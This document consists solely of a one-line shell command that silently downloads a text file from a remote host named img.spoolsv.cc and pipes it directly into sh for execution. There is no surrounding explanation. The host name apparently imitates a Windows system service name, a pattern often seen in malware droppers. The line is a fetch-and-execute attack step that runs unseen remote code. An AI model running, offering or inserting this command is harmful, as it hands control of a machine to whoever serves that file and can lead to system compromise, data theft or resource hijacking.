curl -s http://img.spoolsv.cc/snn50.txt|sh 
